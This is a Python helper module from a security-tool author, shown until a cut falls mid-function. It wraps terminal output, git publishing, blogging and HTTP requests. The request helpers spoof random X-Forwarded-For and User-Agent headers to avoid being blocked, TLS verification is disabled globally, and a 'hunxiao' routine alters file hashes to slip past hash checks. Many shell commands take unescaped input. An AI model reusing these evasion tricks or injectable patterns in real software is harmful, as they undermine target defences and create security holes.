#############################################################
# ___ /           _ |  _ \ _) |
# _ \\ \  / __ \  | |   | | __|
# ) |`  <  |   | | |   | | |
# ____/ _/\_\ .__/ _|\___/ _|\__|
# _|
###
# name: exp10it.py # function: my module
# date: 2016-08-05
# author: quanyechavshuo
# blog: https://3xp10it.github.io
#############################################################


import os
import re
import sys
import random
import time
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import platform
import glob
import datetime
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import threading
import queue
from multiprocessing.dummy import Pool as ThreadPool

from select import select
from time import sleep
try:
    from blessings import Terminal
except:
    os.system("pip3 install blessings")
    from blessings import Terminal
try:
    from progressive.bar import Bar
    from progressive.tree import ProgressTree, Value, BarDescriptor
except:
    os.system("pip3 install progressive")
    from progressive.bar import Bar
    from progressive.tree import ProgressTree, Value, BarDescriptor

if sys.version_info >= (2, 7, 9):
    import ssl
    ssl._create_default_https_context = ssl._create_unverified_context

if sys.version_info <= (3, 0, 0):
    print("sorry,this module works on python3")
    sys.exit(0)


import pymysql
pymysql.install_as_MySQLdb()

try:
    import selenium
except:
    if PY == 2:
        os.system("pip install selenium")
        os.system(
            "wget http://chromedriver.storage.googleapis.com/2.24/chromedriver_linux64.zip")
        os.system("unzip chromedriver_linux64.zip && rm chromedriver_linux64.zip")
        os.system("mv chromedriver /usr/bin")
    elif PY == 3:
        os.system("pip3 install selenium")
        os.system(
            "wget http://chromedriver.storage.googleapis.com/2.24/chromedriver_linux64.zip")
        os.system("unzip chromedriver_linux64.zip && rm chromedriver_linux64.zip")
        os.system("mv chromedriver /usr/bin")
    else:
        print("attention! your code may be wrong here to check python version")


# 下面是彩色打印输出到屏幕方案相关代码,部分import的模块在上面已经有了,下面4个是已经去重后的

from colorama import *


class CLIOutput(object):
    # 一般用法:正常运行要输出的内容用该类的good_print函数,显示运行状态用new_thread_bottom_print函数,其中
    # 如果要终结new_thread_bottom_print线程,将sefl.stop_order置1即可

    import shlex
    import struct
    import subprocess

    def get_terminal_size(self):
        """ getTerminalSize()
         - get width and height of console
         - works on linux,os x,windows,cygwin(windows)
         originally retrieved from:
         http://stackoverflow.com/questions/566746/how-to-get-console-window-width-in-python
        """
        current_os = platform.system()
        tuple_xy = None
        if current_os == 'Windows':
            tuple_xy = self._get_terminal_size_windows()
            if tuple_xy is None:
                tuple_xy = self._get_terminal_size_tput()
                # needed for window's python in cygwin's xterm!
        if current_os in ['Linux', 'Darwin'] or current_os.startswith('CYGWIN'):
            tuple_xy = self._get_terminal_size_linux()
        if tuple_xy is None:
            # print("default")
            tuple_xy = (80, 25)      # default value
        return tuple_xy

    def _get_terminal_size_windows(self):
        try:
            from ctypes import windll, create_string_buffer
            # stdin handle is -10
            # stdout handle is -11
            # stderr handle is -12
            h = windll.kernel32.GetStdHandle(-12)
            csbi = create_string_buffer(22)
            res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
            if res:
                (bufx, bufy, curx, cury, wattr,
                 left, top, right, bottom,
                 maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
                sizex = right - left + 1
                sizey = bottom - top + 1
                return sizex, sizey
        except:
            pass

    def _get_terminal_size_tput(self):
        # get terminal width
        # src: http://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window
        try:
            cols = int(subprocess.check_call(shlex.split('tput cols')))
            rows = int(subprocess.check_call(shlex.split('tput lines')))
            return (cols, rows)
        except:
            pass

    def _get_terminal_size_linux(self):
        def ioctl_GWINSZ(fd):
            try:
                import fcntl
                import termios
                cr = struct.unpack('hh',
                                   fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
                return cr
            except:
                pass
        cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
        if not cr:
            try:
                fd = os.open(os.ctermid(), os.O_RDONLY)
                cr = ioctl_GWINSZ(fd)
                os.close(fd)
            except:
                pass
        if not cr:
            try:
                cr = (os.environ['LINES'], os.environ['COLUMNS'])
            except:
                return None
        return int(cr[1]), int(cr[0])

    def __init__(self):
        init()
        self.lastLength = 0
        self.lastOutput = ''
        self.lastInLine = False
        self.mutex = threading.Lock()
        self.blacklists = {}
        self.mutexCheckedPaths = threading.Lock()
        self.basePath = None
        self.errors = 0

        #下面这个变量是用来控制屏幕底部输出结束的,self.stop_order=1时,结束在屏幕底部输出的线程
        self.stop_order=0

    def inLine(self, string):
        self.erase()
        sys.stdout.write(string)
        sys.stdout.flush()
        self.lastInLine = True

    def erase(self):
        if platform.system() == 'Windows':
            csbi = GetConsoleScreenBufferInfo()
            line = "\b" * int(csbi.dwCursorPosition.X)
            sys.stdout.write(line)
            width = csbi.dwCursorPosition.X
            csbi.dwCursorPosition.X = 0
            FillConsoleOutputCharacter(STDOUT, ' ', width, csbi.dwCursorPosition)
            sys.stdout.write(line)
            sys.stdout.flush()
        else:
            sys.stdout.write('\033[1K')
            sys.stdout.write('\033[0G')

    def newLine(self, string):
        if self.lastInLine == True:
            self.erase()
        if platform.system() == 'Windows':
            sys.stdout.write(string)
            sys.stdout.flush()
            sys.stdout.write('\n')
            sys.stdout.flush()
        else:
            sys.stdout.write(string + '\n')
        sys.stdout.flush()
        self.lastInLine = False
        sys.stdout.flush()

    def good_print(self, message, color='green'):
        # 干净的打印,配合下面的new_thread_bottom_print函数使用不会导致多线程打印错乱
        # message是要打印的string
        # color有green,blue,yellow,cyan,red的选择
        with self.mutex:
            if color == 'green':
                message = Fore.GREEN + message + Style.RESET_ALL
            if color == 'blue':
                message = Fore.BLUE + message + Style.RESET_ALL
            if color == 'yellow':
                message = Fore.YELLOW + message + Style.RESET_ALL
            if color == 'cyan':
                message = Fore.CYAN + message + Style.RESET_ALL
            if color == 'red':
                message = Fore.RED + message + Style.RESET_ALL
            self.newLine(message)

    def bottom_print(self, message):
        with self.mutex:
            x, y = self.get_terminal_size()
            if self.errors > 0:
                message += Style.BRIGHT + Fore.RED
                message += 'Errors: {0}'.format(self.errors)
                message += Style.RESET_ALL
            #if len(message) > x:
            #    message = message[:x]
            self.inLine(message)

    def error(self, reason):
        with self.mutex:
            stripped = reason.strip()
            start = reason.find(stripped[0])
            end = reason.find(stripped[-1]) + 1
            message = reason[0:start]
            message += Style.BRIGHT + Fore.WHITE + Back.RED
            message += reason[start:end]
            message += Style.RESET_ALL
            message += reason[end:]
            self.newLine(message)

    def warning(self, reason):
        message = Style.BRIGHT + Fore.YELLOW + reason + Style.RESET_ALL
        self.newLine(message)

    def header(self, text):
        message = Style.BRIGHT + Fore.MAGENTA + text + Style.RESET_ALL
        self.newLine(message)

    def debug(self, info):
        line = "[{0}] - {1}".format(time.strftime('%H:%M:%S'), info)
        self.newLine(line)

    def continue_bottom_print(self, message):
        # 底部持续打印,可以起到显示当前状态作用
        # stop_order是结束信号,一般是全局变量
        while 1:
            self.bottom_print(message)
            time.sleep(1)
            if self.stop_order==1:
                break

    def new_thread_bottom_print(self, message):
        # stop_order是结束信号,一般是全局变量
        # 这个函数是新开线程在屏幕底部单独一行打印的函数
        # message是要打印的string
        bottom_print_thread = MyThread(self.continue_bottom_print, [message])
        bottom_print_thread.start()

    def os_system_with_bottom_status(self,command):
        #这个函数是在os.system函数的基础上在命令执行期间打印当前正在执行的命令到屏幕底部的函数
        #command是要执行的命令,这个函数调用了上面的new_thread_bottom_print函数,并利用当前类的self.stop_order
        #作为打印开关
        #但是一般来说会出现在非屏幕底部也会打印屏幕底部正在打印的string,因为一般的os.system执行的命令中的打印的
        #string没有上面的good_print函数好,一般的os.system执行的命令中的打印动作相当于print
        self.stop_order=0
        self.new_thread_bottom_print("[正在执行:%s]\r" % command)
        os.system(command)
        self.stop_order=1

# 一般用法:正常运行要输出的内容用该类的good_print函数,显示运行状态用new_thread_bottom_print函数,其中
# 如果要终结new_thread_bottom_print线程,将sefl.stop_order置1即可
# 上面是彩色打印输出到屏幕方案相关代码


def install_scrapy():
    # ubuntu 16.04下安装scrapy
    os.system(
        "sudo apt-get install python-dev python-pip libxml2-dev libxslt1-dev zlib1g-dev libffi-dev \
            libssl-dev")
    os.system("pip3 install Scrapy")


def tab_complete_file_path():
    # this is a function make system support Tab key complete file_path
    # works on linux,it seems windows not support readline module
    import platform
    import glob

    def tab_complete_for_file_path():
        class tabCompleter(object):
            """
            A tab completer that can either complete from
            the filesystem or from a list.
            Partially taken from:
            http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
            source code:https://gist.github.com/iamatypeofwalrus/5637895
            """

            def pathCompleter(self, text, state):
                """
                This is the tab completer for systems paths.
                Only tested on *nix systems
                """
                line = readline.get_line_buffer().split()
                return [x for x in glob.glob(text + '*')][state]

            def createListCompleter(self, ll):
                """
                This is a closure that creates a method that autocompletes from
                the given list.
                Since the autocomplete function can't be given a list to complete from
                a closure is used to create the listCompleter function with a list to complete
                from.
                """
                def listCompleter(text, state):
                    line = readline.get_line_buffer()
                    if not line:
                        return [
                            c + " " for c in ll if c.startswith(line)][state]
                self.listCompleter = listCompleter
        t = tabCompleter()
        t.createListCompleter(["ab", "aa", "bcd", "bdf"])

        readline.set_completer_delims('\t')
        readline.parse_and_bind("tab: complete")
        # readline.set_completer(t.listCompleter)
        # ans = raw_input("Complete from list ")
        # print ans
        readline.set_completer(t.pathCompleter)

    if platform.system() == "Linux":
        try:
            import readline
            tab_complete_for_file_path()
        except:
            os.system("pip install readline")
            tab_complete_for_file_path()
    else:
        try:
            import readline
        except:
            pass

# execute the function to take effect
tab_complete_file_path()


def figlet2file(logo_str, file_abs_path, print_or_not):
    # 输出随机的logo文字到文件或屏幕,第二个参数为0时,只输出到屏幕
    # apt-get install figlet
    # man figlet
    # figure out which is the figlet's font directory
    # my figlet font directory is:
    # figlet -I 2,output:/usr/share/figlet

    try:
        f = os.popen("figlet -I 2")
        all = f.readlines()
        f.close()
        figlet_font_dir = all[0][:-1]
    except:
        os.system("apt-get install figlet")
        f = os.popen("figlet -I 2")
        all = f.readlines()
        f.close()
        figlet_font_dir = all[0][:-1]

    all_font_name_list = get_all_file_name(figlet_font_dir, ['tlf', 'flf'])
    random_font = random.choice(all_font_name_list)
    unsucceed = os.system(
        "figlet -t -f %s %s > /tmp/3" %
        (random_font, logo_str))
    if(unsucceed == 1):
        print("something wrong with figlet,check the command in python source file")
    if file_abs_path != 0:
        try:
            os.system("cat /tmp/3 >> %s" % file_abs_path)
        except:
            print("figlet2file func write to file wrong,check it")
    else:
        pass
    if(print_or_not):
        os.system("cat /tmp/3")
    os.system("rm /tmp/3")


def oneline2nline(oneline, nline, file_abs_path):
    # 将文件中的一行字符串用多行字符串替换,调用时要将"多行字符串的参数(第二个参数)"中的换行符设置为\n
    tmpstr = nline.replace('\n', '\\\n')
    os.system("sed '/%s/c\\\n%s' %s > /tmp/1" %
              (oneline, tmpstr, file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    pass


def lin2win(file_abs_path):
    # 将linux下的文件中的\n换行符换成win下的\n\n换行符
    input_file = file_abs_path
    f = open(input_file, "r+")
    urls = f.readlines()
    f.close()
    os.system("rm %s" % file_abs_path)
    f1 = open(file_abs_path, "a+")
    for url in urls:
        print(url[0:-1])
        # print url is different with print url[0:-1]
        # print url[0:-1] can get the pure string
        # while print url will get the "unseen \n"
        # this script can turn a file with strings
        # end with \n into a file with strings end
        # with \r\n to make it comfortable move the
        # txt file from *nix to win,coz the file with
        # strings end with \n in *nix is ok for human
        # to see "different lines",but this kind of file
        # will turn "unsee different lines" in win
        f1.write(url[0:-1] + "\r\n")
    f1.close()


# attention:
# 由于此处tmp_get_file_name_value和tmp_all_file_name_list在函数外面,so
# 在其他代码中调用get_all_file_name()时要用from name import *,不用import name
# 否则不能调用到get_all_file_name的功能
tmp_get_file_name_value = 0
tmp_all_file_name_list = []


def get_all_file_name(folder, ext_list):
    # exp_list为空时,得到目录下的所有文件名,不返回空文件夹名
    # 返回结果为文件名列表,不是完全绝对路径名
    # eg.folder="/root"时,当/root目录下有一个文件夹a,一个文件2.txt,a中有一个文件1.txt
    # 得到的函数返回值为['a/1.txt','2.txt']
    global tmp_get_file_name_value
    global root_dir
    global tmp_all_file_name_list
    tmp_get_file_name_value += 1
    if tmp_get_file_name_value == 1:
        if folder[-1] == '/':
            root_dir = folder[:-1]
        else:
            root_dir = folder

    allfile = os.listdir(folder)
    for each in allfile:
        each_abspath = os.path.join(folder, each)
        if os.path.isdir(each_abspath):
            get_all_file_name(each_abspath, ext_list)
        else:
            # print each_abspath
            if len(each_abspath) > len(root_dir) + \
                    1 + len(os.path.basename(each)):
                filename = each_abspath[len(root_dir) + 1:]
                # print filename
                if len(ext_list) == 0:
                    tmp_all_file_name_list.append(filename)
                else:
                    for each_ext in ext_list:
                        if(filename.split('.')[-1] == each_ext):
                            # print filename
                            tmp_all_file_name_list.append(filename)
            else:
                # print each
                if len(ext_list) == 0:
                    tmp_all_file_name_list.append(each)
                else:
                    for each_ext in ext_list:
                        if(each.split('.')[-1] == each_ext):
                            # print each
                            tmp_all_file_name_list.append(each)

    return tmp_all_file_name_list


def save2github(file_abs_path, repo_name, comment):
    # 将文件上传到github
    # arg1:文件绝对路经
    # arg2:远程仓库名
    # 提交的commit注释
    local_resp_path = "/root/" + repo_name
    filename = os.path.basename(file_abs_path)
    remote_resp_url = "https://github.com/3xp10it/%s.git" % repo_name
    if os.path.exists(local_resp_path) is False:
        os.system(
            "mkdir %s && cd %s && git init && git pull %s && git remote add origin %s && git status" %
            (local_resp_path, local_resp_path, remote_resp_url, remote_resp_url))
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print("warning!warning!warning! I will exit! There exists a same name script in \
local_resp_path(>>%s),and this script is downloaded from remote github repo,\
you should rename your script if you want to upload it to git:)" % local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then \
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False

        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git push -u origin \
                master" %
            (local_resp_path, comment))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(
            local_resp_path + "/.git") is False:
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print(
                "warning!warning!warning! I will exit! There exists a same name script in local_resp_path\
(>>%s),you should rename your script if you want to upload it to git:)" %
                local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then\
upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False
        os.system("mkdir /tmp/codetmp")
        os.system(
            "cd %s && cp -r * /tmp/codetmp/ && rm -r * &&  git init && git pull %s" %
            (local_resp_path, remote_resp_url))
        os.system(
            "cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" %
            local_resp_path)
        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin \
                %s && git push -u origin master" %
            (local_resp_path, comment, remote_resp_url))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False

    if os.path.exists(local_resp_path) is True and os.path.exists(
            local_resp_path + "/.git") is True:
        # 如果本地local_resp_path存在,且文件夹中有.git,当local_resp_path文件夹中的文件与远程github仓库中的文件
        # 不一致时,且远程仓库有本地仓库没有的文件,选择合并本地和远程仓库并入远程仓库,所以这里采用一并重新合并的
        # 处理方法,(与上一个if中的情况相比,多了一个合并前先删除本地仓库中的.git文件夹的动作),虽然当远程仓库中不
        # 含本地仓库没有的文件时,不用这么做,但是这样做也可以处理那种情况
        if os.path.exists(local_resp_path + "/" + filename) is True:
            print(
                "warning!warning!warning! I will exit! There exists a same name script in local_resp_path\
                    (>>%s),you should rename your script if you want to upload it to git:)" %
                local_resp_path + "/" + filename)
            print(
                "or if you want upload it direcly,I will replace it to this script you are writing and then \
                    upload normally. ")
            print("y/n? default[N]:>")
            choose = input()
            if choose != 'y' and choose != 'Y':
                return False

        os.system("cd %s && rm -r .git" % local_resp_path)
        os.system("mkdir /tmp/codetmp")
        os.system(
            "cd %s && cp -r * /tmp/codetmp/ && rm -r * && git init && git pull %s" %
            (local_resp_path, remote_resp_url))
        os.system(
            "cp -r /tmp/codetmp/* %s && rm -r /tmp/codetmp" %
            local_resp_path)
        os.system("cp %s %s" % (file_abs_path, local_resp_path))
        succeed = os.system(
            "cd %s && git add . && git status && git commit -a -m '%s' && git remote add origin \
                %s && git push -u origin master" %
            (local_resp_path, comment, remote_resp_url))
        if(succeed == 0):
            print("push succeed!!!")
            return True
        else:
            print("push to git wrong,wrong,wrong,check it!!!")
            return False


def get_os_type():
    # 获取操作系统类型,返回结果为"Windows"或"Linux"
    return platform.system()


def post_request(url, data):
    # 发出post请求
    # 第二个参数是要提交的数据,要求为字典格式
    # 返回值为post响应的html正文内容
    try:
        import mechanicalsoup
    except:
        os.system("pip3 install MechanicalSoup")
        import mechanicalsoup
    browser = mechanicalsoup.Browser(soup_config={"features": "lxml"})
    ua = get_random_ua()
    browser.session.headers.update({'User-agent': '%s' % ua})
    x_forwarded_for = get_random_x_forwarded_for()
    browser.session.headers.update({'X-ForWarded-For': '%s' % x_forwarded_for})
    page = browser.post(url, data=data)
    content = page.content
    return content.decode("utf-8")


def get_random_ua():
    # 得到随机user-agent值
    f = open("dicts/user-agents.txt", "r+")
    all_user_agents = f.readlines()
    f.close()
    random_ua_index = random.randint(0, len(all_user_agents) - 1)
    ua = re.sub(r"(\s)$", "", all_user_agents[random_ua_index])
    return ua


def get_random_x_forwarded_for():
    # 得到随机x-forwarded-for值
    numbers = []
    while not numbers or numbers[0] in (10, 172, 192):
        numbers = random.sample(range(1, 255), 4)
    return '.'.join(str(_) for _ in numbers)


def get_request(url, by="MechanicalSoup"):
    # 发出get请求,返回值为一个字典,有三个键值对:eg.{"code":200,"title":None,"content":""}
    # code是int类型
    # title如果没有则返回None,有则返回str类型
    # content如果没有则返回""
    # by是使用方法,有两种:MechanicalSoup|chromedriver
    # https://github.com/hickford/MechanicalSoup
    # selenium+chromedriver,chromedriver不能得到code,默认用MechanicalSoup方法
    if by == "chromedriver":
        result = get_string_from_command("chromedriver")
        if re.search("not found", result):
            os.system(
                "wget http://chromedriver.storage.googleapis.com/2.24/chromedriver_linux64.zip")
            os.system(
                "unzip chromedriver_linux64.zip && rm chromedriver_linux64.zip")
            os.system("mv chromedriver /usr/bin")
        try:
            from selenium import webdriver
        except:
            os.system("pip3 install selenium")
            from selenium import webdriver
        import time
        import selenium.webdriver.chrome.service as service
        service = service.Service('/usr/bin/chromedriver')
        service.start()
        capabilities = {'chrome.binary': '/opt/google/chrome/google-chrome'}
        driver = webdriver.Remote(service.service_url, capabilities)
        driver.get(url)
        code = None
        title = driver.title
        content = driver.page_source
        # time.sleep(5) # Let the user actually see something!
        driver.quit()
        return {
            'code': code,
            'title': title,
            'content': content.decode("utf-8")}
    else:
        try:
            import mechanicalsoup
        except:
            os.system("pip3 install MechanicalSoup")
            import mechanicalsoup

        try:
            browser = mechanicalsoup.Browser(soup_config={"features": "lxml"})
            ua = get_random_ua()
            browser.session.headers.update({'User-agent': '%s' % ua})
            x_forwarded_for = get_random_x_forwarded_for()
            browser.session.headers.update(
                {'X-ForWarded-For': '%s' % x_forwarded_for})
            result = browser.get(url)
            # print(result.url)
            code = result.status_code
            content = result.content
            content = content.decode("utf-8")
            title = BeautifulSoup(content, "lxml").title
            if title is not None:
                title_value = title.string
            else:
                title_value = None
        except:
            # 请求次数过多时被目标服务器禁止访问时
            code = 0
            title_value = "页面载入出错,但是这个页面有可能是存在的,只是因为访问过多被暂时拒绝访问"
            content = 'can not get html content this time,may be blocked by the server to request'

            CLIOutput().good_print(Fore.YELLOW + "可能由于访问过多或url错误(eg.scheme error:http|https)导致当前访问被重置,这个访问将不会得到任何内容")

        return {
            'code': code,
            'title': title_value,
            'content': content}


def get_response_key_value_from_url(url):
    # 得到url响应的关键参数的值
    # 包括:响应状态码,url的title,响应的html内容
    # 发出get请求,返回值为一个字典,有三个键值对:eg.{"code":200,"title":None,"content":content}
    # code是int类型
    # title如果没有则返回None,有则返回str类型
    # content如果没有则返回""
    return get_request(url)


def get_urls_from_file(file):
    # 从文件中获取所有url
    f = open(file, "r+")
    content = f.read()
    # print content
    f.close()
    allurls = []
    all = re.findall('(http(\S)+)', content, re.I)
    for each in all:
        allurls.append(each[0])
    # print allurls
    return allurls


def get_title_from_file(file):
    # 等到文件中的所有url对应的title
    target_allurls = get_urls_from_file(file)
    print("a output file:/tmp/result.txt")
    writed_urls = []
    for each in target_allurls:
        f = open("/tmp/result.txt", "a+")
        tmp = urlparse(each)
        http_domain = tmp.scheme + '://' + tmp.hostname
        title = get_response_key_value_from_url(http_domain)['title']
        time.sleep(1)
        try:
            if http_domain not in writed_urls:
                each_line_to_write = http_domain + '\r\n' + 'upon url is:' + title + '\r\n'
                print(each_line_to_write)
                f.write(each_line_to_write)
                writed_urls.append(http_domain)
        except:
            pass
    f.close()


def check_file_has_logo(file_abs_path):
    a = '### blog: https://3xp10it.github.io'
    with open(file_abs_path, 'r') as foo:
        for line in foo.readlines():
            if a in line:
                foo.close()
                return True
        foo.close()
        return False


def write_code_header_to_file(file_abs_path, function, date, author, blog):
    f = open(file_abs_path, "a+")
    first_line = "#############################################################\n"
    f.write(first_line)
    f.close()
    figlet2file("3xp10it", file_abs_path, False)
    f = open(file_abs_path, "a+")
    all = f.readlines()
    f.close()
    f = open("/tmp/1", "a+")
    for each in all:
        if(each[0:40] != "#" * 40):
            f.write("### " + each)
        else:
            f.write(each)
    f.close()
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    # os.system("cat %s" % file_abs_path)

    f = open(file_abs_path, "a+")
    filename = os.path.basename(file_abs_path)

    f.write("###                                                          \n")
    f.write("### name: %s" % filename + '\n')
    f.write("### function: %s" % function + '\n')
    f.write("### date: %s" % str(date) + '\n')
    f.write("### author: %s" % author + '\n')
    f.write("### blog: %s" % blog + '\n')
    f.write("#############################################################\n")
    if file_abs_path.split(".")[-1] == 'py':
        f.write(
            '''import time\nfrom exp10it import *\nfiglet2file("3xp10it",\
                "/tmp/figletpic",True)\ntime.sleep(1)\n\n''')
    f.close()


def insert_code_header_to_file(file_abs_path, function, date, author, blog):
    all_lines = []
    f = open(file_abs_path, "a+")
    all_lines = f.readlines()
    f.close()
    write_code_header_to_file("/tmp/2", function, date, author, blog)
    f = open("/tmp/2", "a+")
    if file_abs_path.split(".")[-1] == 'py':
        f.write(
            '''import time\nfrom exp10it import *\nfiglet2file("3xp10it",\
                "/tmp/figletpic",True)\ntime.sleep(1)\n\n''')
    for each in all_lines:
        f.write(each)
    f.close()
    os.system("cat /tmp/2 > %s && rm /tmp/2" % file_abs_path)
    filename = os.path.basename(file_abs_path)
    os.system(
        "sed -i 's/### name: %s/### name: %s/g' %s" %
        ('2', filename, file_abs_path))


def newscript():
    # 快速写脚本,加logo,写完后可选上传到github
    figlet2file("3xp10it", "/tmp/figletpic", True)
    time.sleep(1)
    while 1:
        print("1>write a new script")
        print("2>open and edit a exist script")
        print("your chioce:1/2 default[1]:>", end='')
        tmp = input()
        if(tmp != str(2)):
            print("please input your file_abs_path:>", end='')
            file_abs_path = input()
            if(os.path.exists(file_abs_path)):
                print(
                    "file name exists,u need to change the file name,or if you really want the name,it will \
replace the original file!!!")
                print(
                    "replace the original file? Or you want to edit(e/E for edit) the file direcly?")
                print(" y/n/e[N]:>", end=' ')
                choose = input()
                if(choose != 'y' and choose != 'Y' and choose != 'e' and choose != 'E'):
                    continue
                elif(choose == 'y' or choose == 'Y'):
                    os.system("rm %s" % file_abs_path)
                    print("please input the script function:)")
                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "https://3xp10it.github.io"
                    if(False == check_file_has_logo(file_abs_path)):
                        insert_code_header_to_file(
                            file_abs_path, function, date, author, blog)
                    break
            print("please input the script function:)")
            function = input()
            date = datetime.date.today()
            author = "quanyechavshuo"
            blog = "https://3xp10it.github.io"
            if False == check_file_has_logo(file_abs_path) and os.path.basename(
                    file_abs_path) != "newscript.py" and "exp10it.py" != os.path.basename(file_abs_path):
                insert_code_header_to_file(
                    file_abs_path, function, date, author, blog)
            break
        else:
            print("please input your file_abs_path to edit:>", end=' ')
            file_abs_path = input()
            if os.path.exists(file_abs_path) is False:
                print(
                    "file not exist,do you want to edit it and save it as a new file?[y/N] default[N]:>",
                    end=' ')
                choose = input()
                if choose == 'y' or choose == 'Y':
                    if("exp10it.py" != os.path.basename(file_abs_path)):
                        print("please input the script function:)")
                        function = input()
                        date = datetime.date.today()
                        author = "quanyechavshuo"
                        blog = "https://3xp10it.github.io"

                        insert_code_header_to_file(
                            file_abs_path, function, date, author, blog)
                        break
                    else:
                        print(
                            "warning! you are edit a new file named 'exp10it',this is special,you know it's \
your python module's name,so I will exit:)")

                else:
                    continue
            else:
                if(False == check_file_has_logo(file_abs_path) and "exp10it.py" != os.path.basename(file_abs_path)
                        and "newscript.py" != os.path.basename(file_abs_path)):
                    print("please input the script function:)")

                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "https://3xp10it.github.io"
                    insert_code_header_to_file(
                        file_abs_path, function, date, author, blog)
                    break
                else:
                    print("please input the script function:)")
                    function = input()
                    date = datetime.date.today()
                    author = "quanyechavshuo"
                    blog = "https://3xp10it.github.io"
                    break

    os.system("vim %s" % file_abs_path)
    print("do you want this script upload to github server? Y/n[Y]:")
    choose = input()
    if choose != 'n':
        print("please input your remote repository name:)")
        repo_name = input()
        succeed = save2github(file_abs_path, repo_name, function)
        if(succeed):
            print("all is done and all is well!!!")
        else:
            print(
                "save2github wrong,check it,maybe your remote repository name input wrong...")


def blog():
    # 便捷写博客(jekyll+github)函数
    date = datetime.date.today()
    print("please input blog article title:)")
    title = input()
    print("please input blog categories:)")
    categories = input()
    print("please input blog tags,use space to separate:)")
    tags = input()
    tags_list = tags.split(' ')
    tags_write_to_file = ""
    for each in tags_list:
        tags_write_to_file += (' - ' + each + '\\\n')
    tags_write_to_file = tags_write_to_file[:-2]

    article_title = title
    title1 = title.replace(' ', '-')
    filename = str(date) + '-' + title1 + '.md'

    file_abs_path = "/root/myblog/_posts/" + filename
    os.system("cp /root/myblog/_posts/*webshell* %s" % file_abs_path)
    os.system(
        "sed -i 's/^title.*/title:      %s/g' %s" %
        (title, file_abs_path))
    os.system(
        "sed -i 's/date:       .*/date:       %s/g' %s" %
        (str(date), file_abs_path))
    os.system(
        "sed -i 's/summary:    隐藏webshell的几条建议/summary:    %s/g' %s" %
        (title, file_abs_path))
    os.system("sed -i '11,$d' %s" % file_abs_path)
    os.system(
        "sed -i 's/categories: webshell/categories: %s/g' %s" %
        (categories, file_abs_path))
    os.system("sed '/ - webshell/c\\\n%s' %s > /tmp/1" %
              (tags_write_to_file, file_abs_path))
    os.system("cat /tmp/1 > %s && rm /tmp/1" % file_abs_path)
    os.system("vim %s" % file_abs_path)

    print("do you want to update your remote 3xp10it.github.io's blog?")
    print("your chioce: Y/n,default[Y]:>", end=' ')
    upa = input()
    if(upa == 'n' or upa == 'N'):
        print('done!bye:D')
    else:
        unsucceed = os.system("bash /usr/share/mytools/up.sh")
        if(unsucceed == 0):
            os.system("firefox %s" % "https://3xp10it.github.io")


def get_remain_time(
        start_time,
        biaoji_time,
        remain_time,
        jiange_num,
        changing_var,
        total_num):
    # 显示完成一件事所需时间
    # start_time是开始进行时的时间变量
    # biaoji_time是用来标记每次经过jiange_num次数后的时间标记,biaoji_time是个"对当前函数全局"变量
    # remain_time是每隔jiange_num次后计算出的当前剩余完成时间
    # jiange_num是每间隔多少次计算处理速度
    # changing_var是会变化(从0到total_num)的变量
    # total_num是一件事的所有的次数
    # eg.show_remain_time(start[0],biaoji[0],temp_remain_time[0],20,current_num,230000)
    if changing_var == 1:
        biaoji_time = start_time
        return time.strftime("%Hh%Mm%Ss", time.localtime(remain_time))
    else:
        if changing_var % jiange_num == 0:
            nowtime = time.time()
            spend_time = nowtime - biaoji_time
            biaoji_time = nowtime
            speed = jiange_num / spend_time
            remain_time = (total_num - changing_var) / speed
            return time.strftime("%Hh%Mm%Ss", time.localtime(remain_time))
        else:
            return remain_time


def hunxiao(folder_path):
    # 改变md5函数,简单的cmd命令达到混淆效果,可用于上传百度网盘
    # 只适用于windows平台
    import os
    # 上面这句是因为如果其他地方单独调用这一个函数使用from exp10it import hunxiao时不能把exp10it文件开头已经
    # import的os导入,因为这样的导入方式不能导入os
    print(
        "there will be a folder named 'new' which contains the new files,but attention!!! your files those \
    are going to be handled,rename them to a normal name if the file name is not regular,otherwise,the \
    os.system's cmd would not find the path")
    os.chdir(folder_path)
    all_files = os.listdir(".")
    os.system("echo 111 > hunxiao.txt")
    os.system("md new")
    for each in all_files:
        if each[
                :7] != "hunxiao" and each[-2:] != "py" and os.path.isdir(each) is False:
            # cmd="c:\\windows\\system32\\cmd.exe /c copy"
            ext = each.split('.')[-1]
            # print type(each[:-(len(ext)+1)])
            new_file_name = "hunxiao_%s.%s" % (each[:-(len(ext) + 1)], ext)
            cmd = "c:\\windows\\system32\\cmd.exe /c copy %s /b + hunxiao.txt /a new\\%s.%s" % (
                each, new_file_name, ext)
            os.system(cmd)
            # print cmd
    os.system("del hunxiao.txt")


def check_string_is_ip(string):
    # 检测输入的字符串是否是ip值,如果是则返回True,不是则返回False
    p = re.compile(
